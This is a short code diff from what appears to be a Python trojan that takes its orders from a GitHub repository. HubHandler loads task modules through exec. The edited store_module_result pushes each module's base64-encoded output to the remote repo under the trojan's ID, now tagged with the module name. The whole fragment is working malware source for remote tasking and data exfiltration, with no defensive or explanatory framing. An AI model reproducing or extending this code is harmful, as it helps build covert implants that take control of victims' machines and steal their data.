@@ -75,8 +75,8 @@ class HubHandler:
                exec("import %s" % task['module'])
        return config
 
-    def store_module_result(self, data):
-        remote_path = "data/%s/%d.data" % (self.trojan_id, random.randint(1000, 100000))
+    def store_module_result(self, data, module):
+        remote_path = "data/%s/%s%d.data" % (self.trojan_id, module, random.randint(1000, 100000))
         self.repo.create_file(remote_path, "commit message", base64.b64encode(data))
 
 class GitImporter:
@@ -105,7 +105,7 @@ def module_runner(module, ghanlde, args, queue=task_queue):
     queue.put(1)
     result = sys.modules[module].run(**args)
     queue.get()
-    ghandle.store_module_result(result)
+    ghandle.store_module_result(result, module)
 
 
 ghandle = HubHandler() 
